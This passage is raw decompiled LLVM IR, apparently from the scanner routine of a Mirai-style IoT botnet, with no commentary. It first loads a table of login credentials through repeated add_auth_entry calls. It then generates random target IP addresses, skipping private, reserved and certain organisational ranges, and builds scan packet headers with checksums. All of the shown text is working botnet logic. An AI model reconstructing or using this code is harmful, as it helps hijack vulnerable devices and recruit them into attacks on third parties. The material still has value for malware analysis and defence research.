  %v5_103d4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 15)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b594.275 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_103e4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b594.275 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b5f8.295 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_103f4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b5f8.295 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b604.297 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10404 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b604.297 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b610.299 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10414 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b610.299 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b61c.301 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10424 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b61c.301 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b624.303 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_10434 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b548.259 to i32), i32 ptrtoint (i32* @global_var_1b624.303 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1b630.305 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b638.307 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_10444 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b630.305 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b638.307 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_1b508.243 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10454 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b508.243 to i32), i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b640.309 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b640.309 to i32), i32* %r1.global-to-local, align 4
  %v5_10464 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b640.309 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b640.309 to i32), i32 10)
  store i32 ptrtoint ([8 x i8]* @global_var_1b640.309 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10474 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b640.309 to i32), i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b640.309 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_10484 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b640.309 to i32), i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b648.311 to i32), i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b648.311 to i32), i32* %r1.global-to-local, align 4
  %v5_10494 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b648.311 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b648.311 to i32), i32 15)
  store i32 ptrtoint ([5 x i8]* @global_var_1b648.311 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_104a4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b648.311 to i32), i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4a4.221 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_104b4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32 ptrtoint (i32* @global_var_1b4a4.221 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32* %r1.global-to-local, align 4
  %v5_104c4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4b8.227 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_104d4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32 ptrtoint (i32* @global_var_1b4b8.227 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_104e4 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b650.313 to i32), i32 ptrtoint (i32* @global_var_1b4c0.229 to i32), i32 1)
  store i32 ptrtoint ([7 x i8]* @global_var_1b658.315 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_104f4 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b658.315 to i32), i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32 7)
  store i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32* %r1.global-to-local, align 4
  %v3_10504 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32 ptrtoint (i32* @global_var_1b4b0.225 to i32), i32 2)
  store i32 ptrtoint ([4 x i8]* @global_var_1b660.317 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10514 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1b660.317 to i32), i32 ptrtoint (i32* @global_var_1b404.287 to i32), i32 10)
  store i32 ptrtoint ([7 x i8]* @global_var_1b664.319 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b664.319 to i32), i32* %r1.global-to-local, align 4
  %v5_10524 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b664.319 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b664.319 to i32), i32 5)
  store i32 ptrtoint ([9 x i8]* @global_var_1b66c.321 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b66c.321 to i32), i32* %r1.global-to-local, align 4
  %v5_10534 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b66c.321 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b66c.321 to i32), i32 1)
  store i32 %v5_10534, i32* %r0.global-to-local, align 4
  %v2_1053c = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_1053c, i32* @lr, align 4
  br label %dec_label_pc_10544

dec_label_pc_10544:                               ; preds = %dec_label_pc_10c98, %dec_label_pc_1004c
  %stack_var_-1880.0 = phi i32 [ %tmp302, %dec_label_pc_1004c ], [ %stack_var_-1880.2, %dec_label_pc_10c98 ]
  %v0_10850 = phi i32 [ %v2_1053c, %dec_label_pc_1004c ], [ %stack_var_-1888.1, %dec_label_pc_10c98 ]
  %stack_var_-1884.0 = phi i16 [ %v5_10044.le, %dec_label_pc_1004c ], [ %stack_var_-1884.1, %dec_label_pc_10c98 ]
  store i32 ptrtoint (i32* @global_var_24388.186 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v2_1054c = load i32, i32* @global_var_24388.186, align 4
  store i32 %v2_1054c, i32* @r4, align 4
  %v3_10550 = icmp uge i32 %stack_var_-1880.0, %v2_1054c
  store i1 %v3_10550, i1* %cpsr_c.global-to-local, align 1
  %v9_10550 = icmp eq i32 %stack_var_-1880.0, %v2_1054c
  store i1 %v9_10550, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10550, label %dec_label_pc_107d4, label %dec_label_pc_10558

dec_label_pc_10558:                               ; preds = %dec_label_pc_10544
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1055c = ptrtoint i32* %stack_var_-104 to i32
  store i32 0, i32* %stack_var_-52, align 4
  %v2_10564 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10564, i32* @r5, align 4
  br label %dec_label_pc_10568

dec_label_pc_10568:                               ; preds = %bb368, %dec_label_pc_10558
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_1057c = call i32 @rand_next()
  %v1_1057c = trunc i32 %v0_1057c to i16
  store i32 %v0_1057c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26e50.101 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_24358.201 to i32), i32* %ip.global-to-local, align 4
  %v2_10588 = load i32, i32* @global_var_26e50.101, align 4
  store i32 %v2_10588, i32* %r3.global-to-local, align 4
  store i16 %v1_1057c, i16* bitcast (i32* @global_var_2435c.207 to i16*), align 4
  store i32 %v2_10588, i32* @global_var_24364.322, align 4
  br label %dec_label_pc_10594

dec_label_pc_10594:                               ; preds = %dec_label_pc_10668, %dec_label_pc_105c4, %dec_label_pc_1069c, %dec_label_pc_10690, %dec_label_pc_10684, %dec_label_pc_10678, %.thread30, %bb359, %bb358, %bb357, %bb356, %bb355, %dec_label_pc_10660, %dec_label_pc_10658, %bb351, %dec_label_pc_10628, %dec_label_pc_10604, %bb344, %dec_label_pc_105d4, %bb343, %dec_label_pc_105bc, %bb342, %bb361, %dec_label_pc_10568
  %v0_10594 = call i32 @rand_next()
  store i32 %v0_10594, i32* %r0.global-to-local, align 4
  %v1_10598 = urem i32 %v0_10594, 256
  store i32 %v1_10598, i32* %r1.global-to-local, align 4
  %v3_1059c = udiv i32 %v0_10594, 256
  store i32 %v3_1059c, i32* %r3.global-to-local, align 4
  %v3_105a0 = udiv i32 %v0_10594, 65536
  store i32 %v3_105a0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_105a4 = icmp eq i32 %v1_10598, 0
  store i1 %v2_105a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_105a4, label %bb342, label %bb341

bb341:                                            ; preds = %dec_label_pc_10594
  %v3_105a8 = icmp ugt i32 %v1_10598, 126
  store i1 %v3_105a8, i1* %cpsr_c.global-to-local, align 1
  %v8_105a8 = icmp eq i32 %v1_10598, 127
  store i1 %v8_105a8, i1* %cpsr_z.global-to-local, align 1
  br label %bb342

bb342:                                            ; preds = %dec_label_pc_10594, %bb341
  %v0_105b8 = phi i1 [ true, %dec_label_pc_10594 ], [ %v8_105a8, %bb341 ]
  %v1_105ac = urem i32 %v3_1059c, 256
  store i32 %v1_105ac, i32* %ip.global-to-local, align 4
  %v1_105b0 = urem i32 %v3_105a0, 256
  store i32 %v1_105b0, i32* %r2.global-to-local, align 4
  %v1_105b4 = and i32 %v0_10594, 8388608
  %v2_105b4 = icmp ne i32 %v1_105b4, 0
  store i1 %v2_105b4, i1* %cpsr_c.global-to-local, align 1
  %v3_105b4 = udiv i32 %v0_10594, 16777216
  store i32 %v3_105b4, i32* %r0.global-to-local, align 4
  br i1 %v0_105b8, label %dec_label_pc_10594, label %dec_label_pc_105bc

dec_label_pc_105bc:                               ; preds = %bb342
  %v2_105bc = icmp ugt i32 %v1_10598, 2
  store i1 %v2_105bc, i1* %cpsr_c.global-to-local, align 1
  %v7_105bc = icmp eq i32 %v1_10598, 3
  store i1 %v7_105bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105bc, label %dec_label_pc_10594, label %dec_label_pc_105c4

dec_label_pc_105c4:                               ; preds = %dec_label_pc_105bc
  %v1_105c4 = add nsw i32 %v1_10598, -15
  store i32 %v1_105c4, i32* %r3.global-to-local, align 4
  %v2_105c8 = icmp ugt i32 %v1_10598, 55
  store i1 %v2_105c8, i1* %cpsr_c.global-to-local, align 1
  %v7_105c8 = icmp eq i32 %v1_10598, 56
  store i1 %v7_105c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105c8, label %dec_label_pc_10594, label %bb343

bb343:                                            ; preds = %dec_label_pc_105c4
  %v3_105cc = icmp ne i32 %v1_105c4, 0
  store i1 %v3_105cc, i1* %cpsr_c.global-to-local, align 1
  %v8_105cc = icmp eq i32 %v1_105c4, 1
  store i1 %v8_105cc, i1* %cpsr_z.global-to-local, align 1
  %v2_105d0 = xor i1 %v3_105cc, true
  %v3_105d0 = or i1 %v8_105cc, %v2_105d0
  br i1 %v3_105d0, label %dec_label_pc_10594, label %dec_label_pc_105d4

dec_label_pc_105d4:                               ; preds = %bb343
  %v2_105d4 = icmp ugt i32 %v1_10598, 9
  store i1 %v2_105d4, i1* %cpsr_c.global-to-local, align 1
  %v7_105d4 = icmp eq i32 %v1_10598, 10
  store i1 %v7_105d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105d4, label %dec_label_pc_10594, label %dec_label_pc_105dc

dec_label_pc_105dc:                               ; preds = %dec_label_pc_105d4
  %v2_105dc = icmp ugt i32 %v1_10598, 191
  store i1 %v2_105dc, i1* %cpsr_c.global-to-local, align 1
  %v7_105dc = icmp eq i32 %v1_10598, 192
  store i1 %v7_105dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105dc, label %bb344, label %dec_label_pc_105e8

bb344:                                            ; preds = %dec_label_pc_105dc
  %v3_105e0 = icmp ugt i32 %v1_105ac, 167
  store i1 %v3_105e0, i1* %cpsr_c.global-to-local, align 1
  %v8_105e0 = icmp eq i32 %v1_105ac, 168
  store i1 %v8_105e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_105e0, label %dec_label_pc_10594, label %dec_label_pc_105e8

dec_label_pc_105e8:                               ; preds = %dec_label_pc_105dc, %bb344
  %v7_105e8 = icmp eq i32 %v1_10598, 172
  %.421 = zext i1 %v7_105e8 to i32
  store i32 %.421, i32* %r3.global-to-local, align 4
  %v2_105f4 = icmp ugt i32 %v1_105ac, 14
  store i1 %v2_105f4, i1* %cpsr_c.global-to-local, align 1
  %v7_105f4 = icmp eq i32 %v1_105ac, 15
  store i1 %v7_105f4, i1* %cpsr_z.global-to-local, align 1
  %v2_105f8 = xor i1 %v2_105f4, true
  %v3_105f8 = or i1 %v7_105f4, %v2_105f8
  br i1 %v3_105f8, label %.thread8, label %bb347

.thread8:                                         ; preds = %dec_label_pc_105e8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1060c

bb347:                                            ; preds = %dec_label_pc_105e8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_105fc = icmp eq i1 %v7_105e8, false
  store i1 %v2_105fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_105fc, label %dec_label_pc_1060c, label %dec_label_pc_10604

dec_label_pc_10604:                               ; preds = %bb347
  %v2_10604 = icmp ugt i32 %v1_105ac, 30
  store i1 %v2_10604, i1* %cpsr_c.global-to-local, align 1
  %v7_10604 = icmp eq i32 %v1_105ac, 31
  store i1 %v7_10604, i1* %cpsr_z.global-to-local, align 1
  %v2_10608 = xor i1 %v2_10604, true
  %v3_10608 = or i1 %v7_10604, %v2_10608
  br i1 %v3_10608, label %dec_label_pc_10594, label %dec_label_pc_1060c

dec_label_pc_1060c:                               ; preds = %.thread8, %dec_label_pc_10604, %bb347
  %v7_1060c = icmp eq i32 %v1_10598, 100
  %.422 = zext i1 %v7_1060c to i32
  store i32 %.422, i32* %r3.global-to-local, align 4
  %v2_10618 = icmp ugt i32 %v1_105ac, 62
  store i1 %v2_10618, i1* %cpsr_c.global-to-local, align 1
  %v7_10618 = icmp eq i32 %v1_105ac, 63
  store i1 %v7_10618, i1* %cpsr_z.global-to-local, align 1
  %v2_1061c = xor i1 %v2_10618, true
  %v3_1061c = or i1 %v7_10618, %v2_1061c
  br i1 %v3_1061c, label %.thread13, label %bb350

.thread13:                                        ; preds = %dec_label_pc_1060c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10630

bb350:                                            ; preds = %dec_label_pc_1060c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10620 = icmp eq i1 %v7_1060c, false
  store i1 %v2_10620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10620, label %dec_label_pc_10630, label %dec_label_pc_10628

dec_label_pc_10628:                               ; preds = %bb350
  %v2_10628 = icmp ugt i32 %v1_105ac, 125
  store i1 %v2_10628, i1* %cpsr_c.global-to-local, align 1
  %v7_10628 = icmp eq i32 %v1_105ac, 126
  store i1 %v7_10628, i1* %cpsr_z.global-to-local, align 1
  %v2_1062c = xor i1 %v2_10628, true
  %v3_1062c = or i1 %v7_10628, %v2_1062c
  br i1 %v3_1062c, label %dec_label_pc_10594, label %dec_label_pc_10630

dec_label_pc_10630:                               ; preds = %.thread13, %dec_label_pc_10628, %bb350
  %v2_10630 = icmp ugt i32 %v1_10598, 168
  store i1 %v2_10630, i1* %cpsr_c.global-to-local, align 1
  %v7_10630 = icmp eq i32 %v1_10598, 169
  store i1 %v7_10630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10630, label %bb351, label %dec_label_pc_1063c

bb351:                                            ; preds = %dec_label_pc_10630
  %v3_10634 = icmp eq i32 %v1_105ac, 255
  store i1 %v3_10634, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_10634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10634, label %dec_label_pc_10594, label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %dec_label_pc_10630, %bb351
  %v7_1063c = icmp eq i32 %v1_10598, 198
  %.423 = zext i1 %v7_1063c to i32
  store i32 %.423, i32* %r3.global-to-local, align 4
  %v2_10648 = icmp ugt i32 %v1_105ac, 16
  store i1 %v2_10648, i1* %cpsr_c.global-to-local, align 1
  %v7_10648 = icmp eq i32 %v1_105ac, 17
  store i1 %v7_10648, i1* %cpsr_z.global-to-local, align 1
  %v2_1064c = xor i1 %v2_10648, true
  %v3_1064c = or i1 %v7_10648, %v2_1064c
  br i1 %v3_1064c, label %.thread19, label %bb354

.thread19:                                        ; preds = %dec_label_pc_1063c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10660

bb354:                                            ; preds = %dec_label_pc_1063c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10650 = icmp eq i1 %v7_1063c, false
  store i1 %v2_10650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10650, label %dec_label_pc_10660, label %dec_label_pc_10658

dec_label_pc_10658:                               ; preds = %bb354
  %v2_10658 = icmp ugt i32 %v1_105ac, 18
  store i1 %v2_10658, i1* %cpsr_c.global-to-local, align 1
  %v7_10658 = icmp eq i32 %v1_105ac, 19
  store i1 %v7_10658, i1* %cpsr_z.global-to-local, align 1
  %v2_1065c = xor i1 %v2_10658, true
  %v3_1065c = or i1 %v7_10658, %v2_1065c
  br i1 %v3_1065c, label %dec_label_pc_10594, label %dec_label_pc_10660

dec_label_pc_10660:                               ; preds = %.thread19, %dec_label_pc_10658, %bb354
  %v2_10660 = icmp ugt i32 %v1_10598, 222
  store i1 %v2_10660, i1* %cpsr_c.global-to-local, align 1
  %v7_10660 = icmp eq i32 %v1_10598, 223
  store i1 %v7_10660, i1* %cpsr_z.global-to-local, align 1
  %v2_10664 = xor i1 %v7_10660, true
  %v3_10664 = and i1 %v2_10660, %v2_10664
  br i1 %v3_10664, label %dec_label_pc_10594, label %dec_label_pc_10668

dec_label_pc_10668:                               ; preds = %dec_label_pc_10660
  %v1_10668 = add nsw i32 %v1_10598, -6
  store i32 %v1_10668, i32* %r3.global-to-local, align 4
  %v2_1066c = icmp ugt i32 %v1_10598, 10
  store i1 %v2_1066c, i1* %cpsr_c.global-to-local, align 1
  %v7_1066c = icmp eq i32 %v1_10598, 11
  store i1 %v7_1066c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1066c, label %dec_label_pc_10594, label %bb355

bb355:                                            ; preds = %dec_label_pc_10668
  %v3_10670 = icmp ne i32 %v1_10668, 0
  store i1 %v3_10670, i1* %cpsr_c.global-to-local, align 1
  %v8_10670 = icmp eq i32 %v1_10668, 1
  store i1 %v8_10670, i1* %cpsr_z.global-to-local, align 1
  %v2_10674 = xor i1 %v3_10670, true
  %v3_10674 = or i1 %v8_10670, %v2_10674
  br i1 %v3_10674, label %dec_label_pc_10594, label %dec_label_pc_10678

dec_label_pc_10678:                               ; preds = %bb355
  %v2_10678 = icmp ugt i32 %v1_10598, 21
  store i1 %v2_10678, i1* %cpsr_c.global-to-local, align 1
  %v7_10678 = icmp eq i32 %v1_10598, 22
  store i1 %v7_10678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10678, label %dec_label_pc_10594, label %bb356

bb356:                                            ; preds = %dec_label_pc_10678
  %v3_1067c = icmp ugt i32 %v1_10598, 20
  store i1 %v3_1067c, i1* %cpsr_c.global-to-local, align 1
  %v8_1067c = icmp eq i32 %v1_10598, 21
  store i1 %v8_1067c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1067c, label %dec_label_pc_10594, label %dec_label_pc_10684

dec_label_pc_10684:                               ; preds = %bb356
  %v2_10684 = icmp ugt i32 %v1_10598, 27
  store i1 %v2_10684, i1* %cpsr_c.global-to-local, align 1
  %v7_10684 = icmp eq i32 %v1_10598, 28
  store i1 %v7_10684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10684, label %dec_label_pc_10594, label %bb357

bb357:                                            ; preds = %dec_label_pc_10684
  %v3_10688 = icmp ugt i32 %v1_10598, 25
  store i1 %v3_10688, i1* %cpsr_c.global-to-local, align 1
  %v8_10688 = icmp eq i32 %v1_10598, 26
  store i1 %v8_10688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10688, label %dec_label_pc_10594, label %dec_label_pc_10690

dec_label_pc_10690:                               ; preds = %bb357
  %v2_10690 = icmp ugt i32 %v1_10598, 29
  store i1 %v2_10690, i1* %cpsr_c.global-to-local, align 1
  %v7_10690 = icmp eq i32 %v1_10598, 30
  store i1 %v7_10690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10690, label %dec_label_pc_10594, label %bb358

bb358:                                            ; preds = %dec_label_pc_10690
  %v3_10694 = icmp ugt i32 %v1_10598, 28
  store i1 %v3_10694, i1* %cpsr_c.global-to-local, align 1
  %v8_10694 = icmp eq i32 %v1_10598, 29
  store i1 %v8_10694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10694, label %dec_label_pc_10594, label %dec_label_pc_1069c

dec_label_pc_1069c:                               ; preds = %bb358
  %v2_1069c = icmp ugt i32 %v1_10598, 54
  store i1 %v2_1069c, i1* %cpsr_c.global-to-local, align 1
  %v7_1069c = icmp eq i32 %v1_10598, 55
  store i1 %v7_1069c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1069c, label %dec_label_pc_10594, label %bb359

bb359:                                            ; preds = %dec_label_pc_1069c
  %v3_106a0 = icmp ugt i32 %v1_10598, 32
  store i1 %v3_106a0, i1* %cpsr_c.global-to-local, align 1
  %v8_106a0 = icmp eq i32 %v1_10598, 33
  store i1 %v8_106a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_106a0, label %dec_label_pc_10594, label %dec_label_pc_106a8

dec_label_pc_106a8:                               ; preds = %bb359
  %v2_106a8 = icmp ugt i32 %v1_10598, 214
  store i1 %v2_106a8, i1* %cpsr_c.global-to-local, align 1
  %v7_106a8 = icmp eq i32 %v1_10598, 215
  store i1 %v7_106a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106a8, label %.thread30, label %bb360

bb360:                                            ; preds = %dec_label_pc_106a8
  %v3_106ac = icmp ugt i32 %v1_10598, 213
  store i1 %v3_106ac, i1* %cpsr_c.global-to-local, align 1
  %v8_106ac = icmp eq i32 %v1_10598, 214
  store i1 %v8_106ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_106ac, label %bb361, label %dec_label_pc_106bc

.thread30:                                        ; preds = %dec_label_pc_106a8
  br label %dec_label_pc_10594

bb361:                                            ; preds = %bb360
  br label %dec_label_pc_10594

dec_label_pc_106bc:                               ; preds = %bb360
  %v5_106c8 = call i32 @llvm.bswap.i32(i32 %v0_10594)
  store i32 %v5_106c8, i32* %r3.global-to-local, align 4
  %tmp362 = and i32 %v0_10594, 65280
  %tmp363 = call i32 @llvm.bswap.i32(i32 %tmp362)
  %v3_106d0 = udiv i32 %v5_106c8, 16777216
  %tmp364 = and i32 %v0_10594, 16711680
  %tmp365 = call i32 @llvm.bswap.i32(i32 %tmp364)
  %v4_106d8 = udiv i32 %tmp363, 256
  %v4_106dc = mul nuw nsw i32 %tmp365, 256
  store i32 ptrtoint (i8** @global_var_24358.201 to i32), i32* @r0, align 4
  %tmp366 = and i32 %v0_10594, 65536
  %v3_106e4 = icmp ne i32 %tmp366, 0
  store i1 %v3_106e4, i1* %cpsr_c.global-to-local, align 1
  %v4_106e4 = mul i32 %v5_106c8, 16777216
  %v5_106d8 = or i32 %v4_106e4, %v3_106d0
  %v5_106dc = or i32 %v5_106d8, %v4_106d8
  %v5_106e4 = or i32 %v5_106dc, %v4_106dc
  store i32 %v5_106e4, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_24362.323 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_106e4, i32* @global_var_24368.324, align 4
  %v3_106f4 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_24358.201 to i32), i32 20)
  %v4_106f4 = trunc i32 %v3_106f4 to i16
  store i32 %v3_106f4, i32* %r0.global-to-local, align 4
  %v3_106f8 = load i32, i32* %stack_var_-52, align 4
  %v5_10708 = sdiv i32 %v3_106f8, 10
  %v3_1070c = mul i32 %v5_10708, 8
  store i32 %v3_1070c, i32* %r2.global-to-local, align 4
  %v2_10714 = mul i32 %v5_10708, 10
  store i32 %v2_10714, i32* %r3.global-to-local, align 4
  %v3_10718 = icmp uge i32 %v3_106f8, %v2_10714
  store i1 %v3_10718, i1* %cpsr_c.global-to-local, align 1
  %v9_10718 = icmp eq i32 %v3_106f8, %v2_10714
  store i1 %v9_10718, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_24358.201 to i32), i32* %r1.global-to-local, align 4
